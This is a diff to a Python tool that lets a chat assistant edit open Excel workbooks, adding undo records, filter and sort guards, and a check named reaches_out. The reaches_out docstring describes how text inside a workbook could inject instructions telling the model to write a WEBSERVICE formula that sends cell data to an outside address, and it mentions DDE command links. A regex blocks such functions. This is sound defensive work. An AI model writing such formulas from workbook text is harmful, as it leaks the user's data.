@@ -166,6 +166,51 @@ def sheet_name_problem(name: Any) -> str:
     return ""
 
 
+_OUTSIDE_FUNCS = re.compile(r"(?i)(?<![A-Za-z0-9_.])(WEBSERVICE|RTD|IMAGE|CALL|REGISTER\.ID|SQL\.REQUEST)\s*\(")
+
+
+def reaches_out(text: Any) -> str:
+    """Why a cell entry would make Excel reach OUTSIDE the workbook, or "".
+
+    A workbook's text is someone else's words, and a model that follows them
+    could be told to write =WEBSERVICE("https://...?d="&A1): Excel itself then
+    sends the cell to that address, whatever the chat's own limits are. The
+    same for a live link to a web address or a network share, a DDE link
+    (=cmd|...) and a call into a library. Such an entry is typed by the user,
+    never written from chat. Pure, linear."""
+    s = str(text or "")
+    if s[:1] not in ("=", "+", "-", "@"):
+        return ""
+    bare = re.sub(r'"[^"]*"', '""', s)  # what is inside quotes is text, not a call
+    m = _OUTSIDE_FUNCS.search(bare)
+    if m:
+        return f"{m.group(1).upper()}() makes Excel call outside the workbook"
+    if re.search(r"[A-Za-z0-9_.]\|", bare):  # =program|topic!item
+        return "a link to another program (DDE) runs that program"
+    if "://" in bare or "\\\\" in bare:
+        return "it links to a web address or a network share"
+    return ""
+
+
+def _stays_inside(*entries: Any) -> None:
+    for e in entries:
+        why = reaches_out(e) if isinstance(e, str) else ""
+        if why:
+            raise Refusal(f"that formula is not written from chat: {why}. The user can type it in Excel themselves", "reaches_out")
+
+
+def copy_name(workbook_name: str) -> str:
+    """The file name for a copy of an open workbook. ``SaveCopyAs`` writes the
+    workbook's OWN format, so the copy keeps the workbook's own ending (a
+    ledger.csv named ledger.csv.xlsx is a file Excel will not open); only a
+    workbook never saved (Book1) has none, and Excel writes that as .xlsx.
+    Pure."""
+    name = re.sub(r'[<>:"/\\|?*]+', "_", workbook_name).strip() or "workbook"
+    if not re.search(r"\.[A-Za-z0-9]{1,5}$", name):
+        name += ".xlsx"
+    return name
+
+
 def to_cell_text(v: Any) -> Any:
     """A value from the request as what is assigned to a cell."""
     if v is None:
@@ -274,9 +319,19 @@ def _books(apps: "list[Any]") -> "list[tuple[Any, Any]]":
     return out
 
 
-def _find_book(apps: "list[Any]", ref: Any) -> "tuple[Any, Any]":
+_BOOK_ENDING = re.compile(r"\.(?:xl[a-z]{1,2}|csv|txt)$")
+
+
+def _book_stem(name: str) -> str:
+    """A workbook's name without its Excel ending (and only that: "Budget.2025"
+    keeps its ".2025", or it would be taken for Budget.xlsx)."""
+    return _BOOK_ENDING.sub("", name.lower())
+
+
+def _find_book(apps: "list[Any]", ref: Any, *, exact: bool = False) -> "tuple[Any, Any]":
     """The workbook *ref* names (a full path, a file name, or a name without
-    its extension); with no *ref*, the active workbook of the front-most Excel."""
+    its extension); with no *ref*, the active workbook of the front-most Excel.
+    ``exact``: only the workbook open from exactly that place."""
     books = _books(apps)
     if not apps:
         raise Refusal("Excel is not open on this PC. Open the workbook in Excel first.", "no_excel")
@@ -293,11 +348,13 @@ def _find_book(apps: "list[Any]", ref: Any) -> "tuple[Any, Any]":
                 continue
         return books[0]
     hits = [(a, w) for a, w in books if _same_path(str(w.FullName), want)]
-    if not hits:
-        low = want.lower()
+    low = want.lower()
+    if not hits and not exact:
         hits = [(a, w) for a, w in books if str(w.Name).lower() == low]
-    if not hits:
-        hits = [(a, w) for a, w in books if str(w.Name).lower().rsplit(".", 1)[0] == low.rsplit(".", 1)[0]]
+    if not hits and not exact:
+        hits = [(a, w) for a, w in books if _book_stem(str(w.Name)) == _book_stem(low)]
+    if not hits and exact:
+        raise Refusal(f"'{want}' is not open in Excel now, so the change made in it cannot be put back.", "no_such_workbook")
     if not hits:
         names = ", ".join(sorted(str(w.Name) for _, w in books)[:12])
         raise Refusal(f"No open workbook is called '{want}'. Open in Excel now: {names}.", "no_such_workbook")
@@ -352,8 +409,109 @@ def _values(rng: Any, rows: int, cols: int) -> "list[list[Any]]":
     return [[plain(v) for v in row] for row in grid(rng.Value, rows, cols)]
 
 
+#: Whether this Excel has ``Formula2`` (dynamic arrays: Excel 2021 / 365).
+#: Read and written through it where it exists: through the older ``Formula``
+#: a formula that spills is written as ``=@...`` (one value) and a spilled
+#: formula put back by Undo became ``#VALUE!`` (the review, on the real Excel).
+_F2: "bool | None" = None
+
+
+def _has_f2(rng: Any) -> bool:
+    global _F2
+    if _F2 is None:
+        try:
+            rng.Cells(1, 1).Formula2  # noqa: B018 — a read; raises where the property does not exist
+            _F2 = True
+        except Exception:  # noqa: BLE001
+            _F2 = False
+    return _F2
+
+
+def _get_formula(rng: Any) -> Any:
+    return rng.Formula2 if _has_f2(rng) else rng.Formula
+
+
+def _put_formula(rng: Any, v: Any) -> None:
+    if _has_f2(rng):
+        rng.Formula2 = v
+    else:
+        rng.Formula = v
+
+
 def _formulas(rng: Any, rows: int, cols: int) -> "list[list[str]]":
-    return [["" if f is None else str(f) for f in row] for row in grid(rng.Formula, rows, cols)]
+    return [["" if f is None else str(f) for f in row] for row in grid(_get_formula(rng), rows, cols)]
+
+
+def _text_cells(rng: Any, rows: int, cols: int, formulas: "list[list[str]]") -> "list[list[int]]":
+    """Where the range holds TEXT that is not a formula, as [row, column]
+    offsets. Put back as it is, "00123" would be read by Excel as the number
+    123 and "1/2" as a date, so Undo writes these with Excel's text mark."""
+    out: list[list[int]] = []
+    for i, row in enumerate(grid(rng.Value, rows, cols)):
+        for j, v in enumerate(row):
+            if isinstance(v, str) and v and not formulas[i][j].startswith("="):
+                out.append([i, j])
+    return out
+
+
+def _array_formulas(rng: Any, rows: int, cols: int) -> "list[list[str]]":
+    """The array formulas (entered with Ctrl+Shift+Enter) in the range, as
+    [address, formula]: each is put back as ONE array, never cell by cell."""
+    try:
+        if rng.HasArray is False or rows * cols > 5000:
+            return []
+    except Exception:  # noqa: BLE001
+        return []
+    seen: dict[str, str] = {}
+    for i in range(rows):
+        for j in range(cols):
+            cell = rng.Cells(i + 1, j + 1)
+            try:
+                if not bool(cell.HasArray):
+                    continue
+                addr = _addr(cell.CurrentArray)
+                if addr not in seen:
+                    seen[addr] = str(cell.CurrentArray.Cells(1, 1).FormulaArray)
+            except Exception:  # noqa: BLE001
+                continue
+    return [[a, f] for a, f in seen.items()]
+
+
+def _cells_inverse(ws: Any, rng: Any, box: "tuple[int, int, int, int]", formulas: "list[list[str]]") -> dict:
+    """What a step that rewrites cells must be able to put back."""
+    r1, c1, r2, c2 = box
+    rows, cols = r2 - r1 + 1, c2 - c1 + 1
+    inv: dict[str, Any] = {"kind": "cells", "sheet": str(ws.Name), "address": a1(r1, c1, r2, c2), "formulas": formulas}
+    text = _text_cells(rng, rows, cols, formulas)
+    if text:
+        inv["text"] = text
+    arrays = _array_formulas(rng, rows, cols)
+    if arrays:
+        inv["arrays"] = arrays
+    return inv
+
+
+FILTER_WORDS = (
+    "rows on {sheet} are hidden by a filter, and Excel skips hidden rows when a block of cells is "
+    "written or sorted. Show every row first (a clear_filter step, or Data > Clear in Excel)"
+)
+
+
+def _filter_hides(ws: Any, rng: Any) -> bool:
+    """Whether a filter is hiding rows of the range. Excel writes a block
+    across such a range to the VISIBLE cells only, in order: the values land
+    on the wrong rows."""
+    try:
+        if not bool(ws.FilterMode):
+            return False
+    except Exception:  # noqa: BLE001
+        return False
+    # (EntireRow.Hidden answers False for a range only SOME of whose rows are
+    # hidden, measured; the count of visible cells is what tells.)
+    try:
+        return int(rng.SpecialCells(12).Count) != int(rng.Count)
+    except Exception:  # noqa: BLE001 — Excel raises when no cell is visible
+        return True
 
 
 def _calc_words(app: Any) -> str:
@@ -363,7 +521,13 @@ def _calc_words(app: Any) -> str:
         return "automatic"
 
 
-def _error_cells(ws: Any, limit: int = 40) -> "list[str]":
+#: How many error cells of a sheet are read before and after a change. With
+#: 40, a sheet that already had more showed its 41st OLD error as "new" the
+#: moment a change fixed one (the review).
+ERROR_CELLS_READ = 400
+
+
+def _error_cells(ws: Any, limit: int = ERROR_CELLS_READ) -> "list[str]":
     """Addresses of formula cells on *ws* that show an error (bounded)."""
     try:
         cells = ws.UsedRange.SpecialCells(-4123, 16)
@@ -436,6 +600,10 @@ def op_look(req: dict) -> dict:
     if active_wb is not None:
         act: dict[str, Any] = {"workbook": str(active_wb.Name), "calculation": _calc_words(front)}
         try:
+            act["path"] = str(active_wb.FullName)  # so the daemon can judge its folder before showing the selection
+        except Exception:  # noqa: BLE001
+            pass
+        try:
             act["sheet"] = str(front.ActiveSheet.Name)
             act["selection"] = _addr(front.Selection)
             act["cell"] = _addr(front.ActiveCell)
@@ -450,9 +618,18 @@ def op_look(req: dict) -> dict:
         if not text or text.lower() == "used":
             box = _used(ws)
         elif text.lower() == "selection":
-            sel = app.Selection
-            if str(sel.Worksheet.Name) != str(ws.Name) and not req.get("sheet"):
-                ws = sel.Worksheet
+            # THIS workbook's own selection (its window's), never the
+            # application's: with another workbook in front, app.Selection is
+            # that other workbook's cells, and they were returned under this
+            # one's name and past the check of this one's folder (the review).
+            try:
+                sel = wb.Windows(1).RangeSelection
+                sel_ws = sel.Worksheet
+            except Exception:  # noqa: BLE001
+                raise Refusal(f"'{wb.Name}' has no selected cells to read; give a range such as A1:F40", "no_selection") from None
+            if req.get("sheet") and str(sel_ws.Name).lower() != str(ws.Name).lower():
+                raise Refusal(f"the cells selected in '{wb.Name}' are on the sheet '{sel_ws.Name}', not '{ws.Name}'", "no_selection")
+            ws = sel_ws
             box = parse_range(_addr(sel.Areas(1)))
         else:
             box = _clip_to_used(ws, parse_range(text))
@@ -492,10 +669,7 @@ def op_snapshot(req: dict) -> dict:
         # workbook's own name. SaveCopyAs writes the workbook's own format.
         import os  # noqa: PLC0415
 
-        name = re.sub(r'[<>:"/\\|?*]+', "_", str(wb.Name)) or "workbook"
-        if not re.search(r"\.xl[a-z]{1,2}$", name.lower()):
-            name += ".xlsx"
-        path = os.path.join(folder, name)
+        path = os.path.join(folder, copy_name(str(wb.Name)))
     if not path:
         raise Refusal("no place was given for the copy", "bad_request")
     wb.SaveCopyAs(path)
@@ -543,6 +717,12 @@ class Cx:
         self.destructive: list[str] = []
         self.touched: dict[str, None] = {}
         self.pending: set[str] = set()  # sheets an earlier step of this call makes (checking only)
+        # While checking: sheets an earlier step of this call RENAMES, under
+        # their new name. They are real sheets with real data, so a later step
+        # on one is checked and counted like any other (the review: a rename
+        # first made a deletion "on a new sheet", with no card and no copy).
+        self.renamed: dict[str, Any] = {}
+        self.unfiltered: set[str] = set()  # sheets whose filter an earlier step removes (checking only)
         self.i = 0
 
     def sheet(self, name: Any) -> Any:
@@ -553,11 +733,24 @@ class Cx:
             # Assumptions sheet, because that was the active one.
             names = ", ".join(str(s.Name) for s in self.wb.Worksheets)
             raise Refusal(f"say which sheet in 'sheet' (this workbook's sheets: {names})", "bad_step")
-        if self.planning and name.lower() in self.pending:
-            raise _Deferred(name)
-        ws = _sheet(self.wb, name)
+        ws = self.existing(name)
         self.touched[str(ws.Name)] = None
         return ws
+
+    def existing(self, name: Any) -> Any:
+        """A sheet by name, as the workbook will be when the step runs."""
+        key = str(name or "").strip().lower()
+        if self.planning and key in self.renamed:
+            return self.renamed[key]
+        if self.planning and key in self.pending:
+            raise _Deferred(str(name).strip())
+        return _sheet(self.wb, name)
+
+    def guard_filter(self, ws: Any, rng: Any) -> None:
+        if self.planning and str(ws.Name).lower() in self.unfiltered:
+            return
+        if _filter_hides(ws, rng):
+            raise Refusal(FILTER_WORDS.format(sheet=ws.Name), "filtered")
 
     def undo(self, inverse: dict) -> None:
         """Write what this step is about to replace, BEFORE it happens."""
@@ -602,8 +795,13 @@ def _read_formats(rng: Any, rows: int, cols: int, keys: "list[str]") -> dict:
         if key == "font_color":
             return target.Font.Color
         if key == "fill":
-            v = target.Interior.Pattern
-            return None if v is None else [target.Interior.Pattern, target.Interior.Color]
+            it = target.Interior
+            # Over cells of several colours Excel answers Color 0 (black), not
+            # "mixed"; ColorIndex is what comes back empty then (measured). Read
+            # as one colour, Undo painted the whole range black.
+            if it.Pattern is None or it.ColorIndex is None:
+                return None
+            return [it.Pattern, it.Color]
         if key == "align":
             return target.HorizontalAlignment
         if key == "wrap":
@@ -688,6 +886,43 @@ def _restore_formats(rng: Any, rows: int, cols: int, prior: dict) -> None:
                     _write_format(rng.Cells(i + 1, j + 1), key, held["cells"][i][j])
 
 
+_LOST = object()
+
+
+def _held_at(held: dict, i: int, j: int) -> Any:
+    if "all" in held:
+        return held["all"]
+    if "cells" in held:
+        return held["cells"][i][j]
+    return _LOST
+
+
+def _restore_formats_checked(rng: Any, rows: int, cols: int, prior: dict, want: "dict | None") -> int:
+    """Put formats back, leaving alone any the user changed AFTER the change
+    (*want* is what the change left; ``None`` skips the check). Returns how
+    many cells were left as they are."""
+    left_cells: set[tuple[int, int]] = set()
+    for key, held in prior.items():
+        w = (want or {}).get(key)
+        if w is None:
+            _restore_formats(rng, rows, cols, {key: held})
+            continue
+        now = _read_formats(rng, rows, cols, [key])[key]
+        if now == w:
+            _restore_formats(rng, rows, cols, {key: held})
+            continue
+        if "lost" in now or "lost" in w or "lost" in held:
+            left_cells.update((i, j) for i in range(rows) for j in range(cols))
+            continue
+        for i in range(rows):
+            for j in range(cols):
+                if _held_at(now, i, j) == _held_at(w, i, j):
+                    _write_format(rng.Cells(i + 1, j + 1), key, _held_at(held, i, j))
+                else:
+                    left_cells.add((i, j))
+    return len(left_cells)
+
+
 def _note_cell_changes(cx: Cx, ws: Any, r1: int, c1: int, before_v: list, before_f: list, after_v: list, after_f: list) -> None:
     name = str(ws.Name)
     for i, row in enumerate(after_f):
@@ -758,6 +993,7 @@ def h_set(cx: Cx, op: dict) -> dict:
             single = single if single.startswith("=") else "=" + single
         else:
             single = to_cell_text(op.get("value"))
+    _stays_inside(single, *(v for r in (new or []) for v in r))
     before_f = _formulas(rng, rows, cols) if has_value else []
     if has_value:
         probe = new if new is not None else (None if rows * cols > 1 and isinstance(single, str) and single.startswith("=") else [[single] * cols for _ in range(rows)])
@@ -768,32 +1004,80 @@ def h_set(cx: Cx, op: dict) -> dict:
     info["summary"] = (
         f"write {rows * cols} cell(s) at {where}" if has_value else f"format {where}"
     ) + (f" ({', '.join(sorted(fm))})" if fm else "")
+    if has_value and rows * cols > 1:
+        cx.guard_filter(ws, rng)
     if cx.planning:
         return info
-    before_v = _values(rng, rows, cols) if has_value else []
-    inverse: dict[str, Any] = {"kind": "cells", "sheet": str(ws.Name), "address": a1(r1, c1, r2, c2)}
+    # What is RECORDED may be wider than what is written: a formula written
+    # into a table's column is filled down the whole column by Excel itself,
+    # and those cells must be listed and put back too.
+    writes_formula = (isinstance(single, str) and single.startswith("=")) or any(
+        isinstance(v, str) and v.startswith("=") for r in (new or []) for v in r
+    )
+    wbox = _table_column_box(rng, (r1, c1, r2, c2)) if has_value and writes_formula else (r1, c1, r2, c2)
+    wr1, wc1, wr2, wc2 = wbox
+    wrows, wcols = wr2 - wr1 + 1, wc2 - wc1 + 1
+    wrng = rng if wbox == (r1, c1, r2, c2) else _rng(ws, *wbox)
+    wbefore_f = before_f if wrng is rng else _formulas(wrng, wrows, wcols)
+    before_v = _values(wrng, wrows, wcols) if has_value else []
+    inverse: dict[str, Any] = {"kind": "cells", "sheet": str(ws.Name), "address": a1(*wbox)}
     if has_value:
-        inverse["formulas"] = before_f
-    if fm:
-        inverse["formats"] = _read_formats(rng, rows, cols, sorted(fm))
+        inverse = _cells_inverse(ws, wrng, wbox, wbefore_f)
+    # A value can change a cell's number format by itself ("2026-01-31", "50%"),
+    # so that format is kept with every write, not only when the step sets one.
+    keys = sorted(set(fm) | ({"number_format"} if has_value else set()))
+    formats = _read_formats(wrng, wrows, wcols, keys)
+    if "number_format" not in fm and "lost" in formats.get("number_format", {}):
+        formats.pop("number_format")  # too large and mixed to keep cell by cell: nothing is claimed about it
+    if formats:
+        inverse["formats"] = formats
     cx.undo(inverse)
     if "number_format" in fm:  # before the value, so text typed as text stays text
         rng.NumberFormat = fm["number_format"]
     if has_value:
         if new is not None:
-            rng.Formula = tuple(tuple(r) for r in new)
+            _put_formula(rng, tuple(tuple(r) for r in new))
         elif isinstance(single, str) and single.startswith("="):
-            rng.Formula = single
+            _put_formula(rng, single)
         else:
             rng.Value = single
     _apply_formats(rng, {k: v for k, v in fm.items() if k != "number_format"})
+    after: dict[str, Any] = {}
+    if formats:
+        after["formats"] = _read_formats(wrng, wrows, wcols, sorted(formats))
     if has_value:
-        after_f = _formulas(rng, rows, cols)
-        _note_cell_changes(cx, ws, r1, c1, before_v, before_f, _values(rng, rows, cols), after_f)
-        cx.after({"formulas": after_f})
-    else:
-        cx.after({})
+        after_f = _formulas(wrng, wrows, wcols)
+        had = cx.changed_cells
+        _note_cell_changes(cx, ws, wr1, wc1, before_v, wbefore_f, _values(wrng, wrows, wcols), after_f)
+        after["formulas"] = after_f
+        if cx.changed_cells == had:
+            # Excel takes a value for a merged cell only in its first cell and
+            # says nothing; the answer must not read as a change.
+            info["warning"] = (f"no cell changed at {where}: it already held this, or Excel did not take it "
+                               "(a merged cell takes a value only in its first cell)")
+            if not fm:
+                info["no_change"] = True
+    cx.after(after)
     return info
+
+
+def _table_column_box(rng: Any, box: "tuple[int, int, int, int]") -> "tuple[int, int, int, int]":
+    """*box* stretched over the rows of the table it sits in (same columns),
+    or *box* itself outside a table."""
+    r1, c1, r2, c2 = box
+    try:
+        lo = rng.ListObject
+        body = None if lo is None else lo.DataBodyRange
+        if body is None:
+            return box
+        b1 = int(body.Row)
+        b2 = b1 + int(body.Rows.Count) - 1
+        wide = (min(r1, b1), c1, max(r2, b2), c2)
+        if (wide[2] - wide[0] + 1) * (c2 - c1 + 1) > MAX_CELLS_PER_STEP:
+            return box
+        return wide
+    except Exception:  # noqa: BLE001
+        return box
 
 
 def h_clear(cx: Cx, op: dict) -> dict:
@@ -809,10 +1093,12 @@ def h_clear(cx: Cx, op: dict) -> dict:
     cx.formulas_lost += sum(1 for r in before_f for f in r if f.startswith("="))
     info = {"op": "clear", "where": f"{ws.Name}!{a1(r1, c1, r2, c2)}", "cells": rows * cols, "overwrites": over,
             "summary": f"clear the contents of {ws.Name}!{a1(r1, c1, r2, c2)} ({over} cell(s) hold something)"}
+    if rows * cols > 1:
+        cx.guard_filter(ws, rng)
     if cx.planning:
         return info
     before_v = _values(rng, rows, cols)
-    cx.undo({"kind": "cells", "sheet": str(ws.Name), "address": a1(r1, c1, r2, c2), "formulas": before_f})
+    cx.undo(_cells_inverse(ws, rng, (r1, c1, r2, c2), before_f))
     rng.ClearContents()
     after_f = _formulas(rng, rows, cols)
     _note_cell_changes(cx, ws, r1, c1, before_v, before_f, _values(rng, rows, cols), after_f)
@@ -832,21 +1118,45 @@ def h_add_sheet(cx: Cx, op: dict) -> dict:
         cx.pending.add(name.lower())
         return info
     cx.undo({"kind": "sheet_added", "name": name})
-    last = cx.wb.Sheets(cx.wb.Sheets.Count)
-    was = cx.wb.ActiveSheet
-    ws = cx.wb.Worksheets.Add(None, last)  # (Before, After): after the last sheet
-    ws.Name = name
-    try:
-        was.Activate()  # adding a sheet shows it; put the user's sheet back in front
-    except Exception:  # noqa: BLE001
-        pass
+    _add_named_sheet(cx, name)
     cx.touched[name] = None
     cx.after({})
     return info
 
 
+def _drop_sheet(app: Any, ws: Any) -> None:
+    alerts = app.DisplayAlerts
+    try:
+        app.DisplayAlerts = False
+        ws.Delete()
+    finally:
+        app.DisplayAlerts = alerts
+
+
+def _add_named_sheet(cx: Cx, name: str) -> Any:
+    """A new last sheet called *name*, the user's sheet left in front. Excel
+    adds the sheet and only then takes the name: a name it refuses ("History"
+    is one it keeps for itself) must not leave a stray Sheet3 behind."""
+    was = cx.wb.ActiveSheet
+    ws = cx.wb.Worksheets.Add(None, cx.wb.Sheets(cx.wb.Sheets.Count))  # (Before, After): after the last sheet
+    try:
+        ws.Name = name
+    except BaseException:
+        try:
+            _drop_sheet(cx.app, ws)
+        except Exception:  # noqa: BLE001
+            pass
+        raise
+    finally:
+        try:
+            was.Activate()  # adding a sheet shows it; put the user's sheet back in front
+        except Exception:  # noqa: BLE001
+            pass
+    return ws
+
+
 def h_rename_sheet(cx: Cx, op: dict) -> dict:
-    ws = _sheet(cx.wb, _need(op, "sheet"))
+    ws = cx.existing(_need(op, "sheet"))
     to = str(_need(op, "to"))
     bad = sheet_name_problem(to)
     if bad:
@@ -856,7 +1166,7 @@ def h_rename_sheet(cx: Cx, op: dict) -> dict:
     frm = str(ws.Name)
     info = {"op": "rename_sheet", "where": frm, "summary": f"rename sheet '{frm}' to '{to}'"}
     if cx.planning:
-        cx.pending.add(to.lower())
+        cx.renamed[to.lower()] = ws
         return info
     cx.undo({"kind": "sheet_renamed", "from": frm, "to": to})
     ws.Name = to
@@ -865,7 +1175,7 @@ def h_rename_sheet(cx: Cx, op: dict) -> dict:
 
 
 def h_delete_sheet(cx: Cx, op: dict) -> dict:
-    ws = _sheet(cx.wb, _need(op, "sheet"))
+    ws = cx.existing(_need(op, "sheet"))
     name = str(ws.Name)
     if int(cx.wb.Worksheets.Count) <= 1:
         raise Refusal("a workbook must keep at least one sheet", "bad_step")
@@ -930,7 +1240,9 @@ def _delete(cx: Cx, op: dict, rows: bool) -> dict:
     info = {"op": op["op"], "where": f"{ws.Name}!{label}", "summary": f"delete {what}s {label} on {ws.Name}", "undoable": False}
     if cx.planning:
         return info
-    cx.undo({"kind": "none", "what": f"{what}s {label} on {ws.Name} were deleted"})
+    # "moves": every cell after the deleted lines now has another address, so
+    # an Undo must not go on to the steps made BEFORE this one.
+    cx.undo({"kind": "none", "what": f"{what}s {label} on {ws.Name} were deleted", "moves": True})
     _lines(ws, first, count, rows).Delete()
     cx.after({})
     return info
@@ -947,6 +1259,71 @@ def _header_col(ws: Any, box: "tuple[int, int, int, int]", key: Any) -> int:
     if re.fullmatch(r"[A-Za-z]{1,3}", s) and c1 <= col_num(s) <= c2:
         return col_num(s)
     raise Refusal(f"'{s}' is neither a column letter inside the range nor one of its headings ({', '.join(h for h in heads if h)[:200]})", "bad_step")
+
+
+#: What a sort carries along with each row besides its contents.
+SORT_FORMAT_KEYS = ["number_format", "bold", "italic", "font_size", "font_color", "fill", "align", "wrap", "border"]
+
+
+def _notes_in(rng: Any, limit: int = 2000) -> "list[list[Any]]":
+    """The notes on a range of several cells, as [row, column, text]."""
+    try:
+        cells = rng.SpecialCells(-4144)
+    except Exception:  # noqa: BLE001 — Excel raises when there are none
+        return []
+    out: list[list[Any]] = []
+    for c in cells:
+        try:
+            out.append([int(c.Row), int(c.Column), str(c.Comment.Text())])
+        except Exception:  # noqa: BLE001
+            continue
+        if len(out) >= limit:
+            break
+    return out
+
+
+def _moved_with_rows(ws: Any, box: "tuple[int, int, int, int]", header: bool) -> dict:
+    """What a sort of *box* will move besides the cells' contents, so Undo can
+    put it back: the formats that differ down a column (a yellow row, a bold
+    line) and the cells' notes. A column that is the same all the way down is
+    not kept (a sort cannot change it)."""
+    r1, c1, r2, c2 = box
+    first = r1 + (1 if header else 0)
+    rows = r2 - first + 1
+    if rows < 2:
+        return {}
+    out: dict[str, Any] = {"first_row": first}
+    if c2 - c1 + 1 > 60:
+        out["formats_lost"] = True
+    else:
+        held_cols: dict[str, dict] = {}
+        for c in range(c1, c2 + 1):
+            held = {k: v for k, v in _read_formats(_rng(ws, first, c, r2, c), rows, 1, SORT_FORMAT_KEYS).items() if "all" not in v}
+            if any("lost" in v for v in held.values()):
+                out["formats_lost"] = True
+                held = {k: v for k, v in held.items() if "lost" not in v}
+            if held:
+                held_cols[str(c)] = held
+        if held_cols:
+            out["col_formats"] = held_cols
+    notes = _notes_in(_rng(ws, first, c1, r2, c2))
+    if notes:
+        out["notes"] = notes
+    return out
+
+
+def _put_moved_back(ws: Any, inv: dict) -> None:
+    _r1, c1, r2, c2 = parse_range(inv["address"])
+    first = int(inv.get("first_row") or 0)
+    if not first:
+        return
+    for c, held in (inv.get("col_formats") or {}).items():
+        _restore_formats(_rng(ws, first, int(c), r2, int(c)), r2 - first + 1, 1, held)
+    if inv.get("notes"):
+        for row, col, _text in _notes_in(_rng(ws, first, c1, r2, c2)):
+            ws.Cells(row, col).Comment.Delete()
+        for row, col, text in inv["notes"]:
+            ws.Cells(row, col).AddComment(text)
 
 
 def h_sort(cx: Cx, op: dict) -> dict:
@@ -969,11 +1346,24 @@ def h_sort(cx: Cx, op: dict) -> dict:
         plan.append((col, 2 if str(k.get("order") or "asc").lower().startswith("d") else 1))
     names = ", ".join(f"{col_letter(c)} {'descending' if o == 2 else 'ascending'}" for c, o in plan)
     info = {"op": "sort", "where": f"{ws.Name}!{a1(*box)}", "summary": f"sort {ws.Name}!{a1(*box)} by {names}"}
+    rng = _rng(ws, r1, c1, r2, c2)
+    cx.guard_filter(ws, rng)
+    if op.get("alone") is not True:
+        # Excel's own window asks "expand the selection?"; from outside it
+        # sorts the part and leaves the rest of each row behind.
+        count = cx.app.WorksheetFunction.CountA
+        beside = [col_letter(c) for c in (c1 - 1, c2 + 1) if 1 <= c <= 16_384 and int(count(_rng(ws, r1, c, r2, c)))]
+        if beside:
+            raise Refusal(
+                f"column {' and '.join(beside)} beside {ws.Name}!{a1(*box)} holds data on the same rows, and the sort "
+                "would leave it where it is (every row mixed up). Give the whole table as the range, or add "
+                '"alone": true to sort only this part', "partial_sort")
     if cx.planning:
         return info
-    rng = _rng(ws, r1, c1, r2, c2)
     before_f = _formulas(rng, rows, cols)
-    cx.undo({"kind": "cells", "sheet": str(ws.Name), "address": a1(*box), "formulas": before_f})
+    inverse = _cells_inverse(ws, rng, box, before_f)
+    inverse.update(_moved_with_rows(ws, box, header))
+    cx.undo(inverse)
     srt = ws.Sort
     srt.SortFields.Clear()
     first_data = r1 + (1 if header else 0)
@@ -1013,9 +1403,13 @@ def h_clear_filter(cx: Cx, op: dict) -> dict:
     ws = cx.sheet(op.get("sheet"))
     info = {"op": "clear_filter", "where": str(ws.Name), "summary": f"show every row on {ws.Name} again (remove the filter)"}
     if cx.planning:
+        cx.unfiltered.add(str(ws.Name).lower())
         return info
-    cx.undo({"kind": "none", "what": f"the filter on {ws.Name} was removed", "harmless": True})
-    if bool(ws.AutoFilterMode):
+    had = bool(ws.AutoFilterMode)
+    # With no filter on there is nothing to put back; a filter that WAS on is
+    # not rebuilt by Undo, and Undo says so (it used to say "back to how it was").
+    cx.undo({"kind": "none", "what": f"the filter on {ws.Name} was removed (set it again in Excel: Data > Filter)", "harmless": not had})
+    if had:
         ws.AutoFilterMode = False
     cx.after({})
     return info
@@ -1078,6 +1472,9 @@ def h_conditional_format(cx: Cx, op: dict) -> dict:
     known = set(_CF_OPS) | {"formula", "text_contains", "duplicates", "top", "bottom", "data_bar", "color_scale"}
     if rule not in known:
         raise Refusal(f"rule is one of: {', '.join(sorted(known))}", "bad_step")
+    f = op.get("formula")
+    _stays_inside(f if not isinstance(f, str) or f[:1] in "=+-@" else "=" + f,
+                  *(str(op[k]) for k in ("value", "value2") if op.get(k) is not None))
     info = {"op": "conditional_format", "where": f"{ws.Name}!{a1(*box)}",
             "summary": f"add a colour rule ({rule.replace('_', ' ')}) to {ws.Name}!{a1(*box)}"}
     if cx.planning:
@@ -1092,9 +1489,10 @@ def h_conditional_format(cx: Cx, op: dict) -> dict:
         f = str(_need(op, "formula"))
         fc = fcs.Add(2, 0, f if f.startswith("=") else "=" + f)
     elif rule == "text_contains":
-        pythoncom, _ = _com()
-        m = pythoncom.Missing
-        fc = fcs.Add(9, m, m, m, str(_need(op, "value")), 0)
+        # Excel's own "text that contains" rule is this formula underneath
+        # (the positional call with empty arguments was refused by Excel).
+        text = str(_need(op, "value")).replace('"', '""')
+        fc = fcs.Add(2, 0, f'=NOT(ISERROR(SEARCH("{text}",{a1(box[0], box[1])})))')
     elif rule == "duplicates":
         fc = fcs.AddUniqueValues()
         fc.DupeUnique = 1
@@ -1151,6 +1549,25 @@ def _validation_put(rng: Any, held: "dict | None") -> None:
         v.InputMessage = held["input"]
 
 
+def _validation_prior(rng: Any, box: "tuple[int, int, int, int]") -> dict:
+    """The rule(s) a range holds before a new one replaces them. Excel answers
+    "no rule" both for a range with none and for one where only SOME cells
+    have a rule (or the rules differ); the second kind is kept cell by cell,
+    or Undo would take the user's own dropdowns away."""
+    whole = _validation_now(rng)
+    rows, cols = box[2] - box[0] + 1, box[3] - box[1] + 1
+    if whole is not None or rows * cols == 1:
+        return {"prior": whole}
+    if rows * cols <= 2000:
+        cells = [[_validation_now(rng.Cells(i + 1, j + 1)) for j in range(cols)] for i in range(rows)]
+        return {"prior": None, "cells": cells} if any(v for r in cells for v in r) else {"prior": None}
+    try:
+        rng.SpecialCells(-4174)  # cells with a rule; Excel raises when the range has none
+    except Exception:  # noqa: BLE001
+        return {"prior": None}
+    return {"prior": None, "lost": True}
+
+
 def h_validation(cx: Cx, op: dict) -> dict:
     ws = cx.sheet(op.get("sheet"))
     box = parse_range(_need(op, "range"))
@@ -1181,13 +1598,14 @@ def h_validation(cx: Cx, op: dict) -> dict:
         else:
             new = {"type": _VAL_TYPES[kind], "alert": 1, "operator": 8, "f1": str(hi), "f2": ""}
         words = f"a {kind} number rule" if kind != "date" else "a date rule"
+    _stays_inside(new["f1"], new["f2"])
     new["error"] = str(op.get("message") or "")
     new["input"] = str(op.get("prompt") or "")
     info = {"op": "validation", "where": f"{ws.Name}!{a1(*box)}", "summary": f"add {words} to {ws.Name}!{a1(*box)}"}
     if cx.planning:
         return info
     rng = _rng(ws, *box)
-    cx.undo({"kind": "validation_set", "sheet": str(ws.Name), "address": a1(*box), "prior": _validation_now(rng)})
+    cx.undo({"kind": "validation_set", "sheet": str(ws.Name), "address": a1(*box), **_validation_prior(rng, box)})
     _validation_put(rng, new)
     cx.after({"now": _validation_now(rng)})
     return info
